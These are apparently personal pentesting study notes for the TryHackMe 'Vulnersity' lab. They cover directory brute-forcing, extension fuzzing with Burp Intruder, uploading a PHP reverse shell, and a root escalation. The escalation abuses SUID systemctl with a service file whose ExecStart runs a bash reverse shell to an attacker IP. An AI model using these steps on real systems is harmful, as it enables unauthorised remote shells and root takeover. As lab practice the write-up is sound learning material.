# pentesting

# documenting my progress for learning penetration testing


# TryHackMe - Vulnersity
# Task 2 Reconnaissance

# Task 3 Locating directories using GoBuster
  gobuster dir -u http://<ip>:3333 -w <word list location>
  sudo gobuster dir -u http://<ip>:3333 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
  -w  wordlist

  ![image](https://user-images.githubusercontent.com/87742637/126427026-024e8ca6-cb40-4d02-a243-c80fb4a9331c.png)

  Can test which directory that has an upload form page
    http://<ip>:3333/internal/ returns the page with an upload form
  
  ![image](https://user-images.githubusercontent.com/87742637/126427174-9e95efac-8ece-4a7d-8771-e40eebec02dd.png)

# Task 4 Compromise the webserver
  Using BurpSuite, we can upload a file using the upload form page and check the accept parameters
  
  ![image](https://user-images.githubusercontent.com/87742637/126427456-dea2daa9-78d9-4f91-922d-32babc5b2f0a.png)
  
  1. Create phpext.txt with listed php extensions
  2. Upload file to /internal/ upload form
  3. Intercept request with BurpSuite
  4. right click and send to intruder
  5. Click on the Positions tab, find file name and "Add ยง" to the ext
  ![image](https://user-images.githubusercontent.com/87742637/126428918-55904e44-db53-4019-a691-95e338674809.png)
  6. Click on Payloads, and select "Sniper" attack type
    a.  Payload Sets: Select Payload set: 1, Payload type: Simple list
    b.  Payload type: Simple list
    c. Payload Options: Select the file created
  7. Start attack
  8. Rename shell.php to shell.phtml
  9. Upload file to test for success
  
  
  PHP Reverse shell (payload)
  Reverse shell works by being called on the remote host and forcing this host to make a connection to me.
  Listen for incoming connections, upload and have shell executed which will give me control.
  1. Download the reverse PHP shell
  https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
  2. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip
    run $ ip a s
  3. Rename file to php-reverse-shell.phtml (accepted extension)
  4. Run cmd: nc -lvnp 1234 (listen to incoming connections using netcat)
  5. Upload shell and navigate to... (executes payload)
  http://<ip>:3333/internal/uploads/php-reverse-shell.phtml
  6. Enumerate users on system with cmd: cat /etc/passwd
  7. cd /home/bill (access home directory)
  8. cat user.txt
  
  
  
# Task 5 Privilege Escalation
  - SUID (set owner userId upon exec) gives temp permissions to a user to run the program/file with the permission of the       file owner
  - The /usr/bin/passwd has the SUID bit set on it to change your password
  ![image](https://user-images.githubusercontent.com/87742637/126433249-f41760c7-cce2-4cea-89db-8fdc96a8fc8c.png)
  - PrivEsc through SUID is common in CTFs
  
  - Search for SUID files
    - specify user that owns binary
    - hint: find / -user root -perm -4000 -exec ls -ldb {} \;
    - $ find / -user root -perm 4000 -print 2>/dev/null
  ![image](https://user-images.githubusercontent.com/87742637/126433642-613081f2-d050-4713-a1b3-89f9d63d0d4c.png)
    - /bin/systemctl (sc system used on most linux dist, create our own service that can exec our arbritrary cmds as a           particular user
   
  - Become root and get last flag
    1. $ cd /tmp (1st instance)
  
    2. $ cd THM/Vulnersity
    3. $ vim root.service
    
    4. Write to root.service
    ---
    [Unit]
    Description=root
    
    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ip a s>/4444 0>&1'
  
    [Install]
    WantedBy=multi-user.target
    
    ---
    - The ExecStart line can be found by googling
    - bash reverse shell (for bash TCP)
  
    5. (Serve particular file?) by running cmd
      sudo python -m SimpleHTTPServer 80
    
    6. (1. $ cd /tmp (1st terminal))
      - In /tmp dir
      wget http://<ip a s/root.service
                      
                      
    7. 2nd terminal
      nc -nvlp 4444 (port specified in root.service)
      
    8. 1st terminal
      $ systemctl enable /tmp/root.service (works if 2 symlinks are created)
      $ systemctl start root
      
    9. After this, we gain access to root
      $ cd /root
      $ ls
      $ cat root.txt (containing flag)
            
      
    
    
  
  
  
